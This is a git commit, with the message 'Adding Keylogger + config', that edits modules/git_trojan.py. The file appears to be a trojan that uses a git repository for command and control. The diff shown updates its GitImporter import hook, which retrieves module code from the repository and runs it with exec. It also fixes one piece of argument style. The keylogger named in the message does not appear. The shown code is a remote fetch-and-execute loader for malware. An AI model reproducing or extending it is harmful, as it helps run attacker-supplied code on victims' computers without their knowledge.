2bd9fa57f0ce24ac2c5a7a3190531e7560926815
root <root@localhost.localdomain>
2019-05-27 16:33:19 -0700

    Adding Keylogger + config

--- modules/git_trojan.py
+++ modules/git_trojan.py
@@ -70,7 +70,7 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self, fullname, path = None):
+    def find_module(self, fullname, path=None):
         if configured:
             print("[*] Attempting to retrieve %s" % fullname)
             new_library = get_file_contents("modules/%s" % fullname)
@@ -83,7 +83,8 @@ class GitImporter(object):
 
     def load_module(self, name):
 
-        module = importlib.new_module(name)
+        module = importlib.util.module_from_spec(importlib.util.find_spec(name))
+
         exec(self.current_module_code, module.__dict__)
         sys.modules[name] = module
 
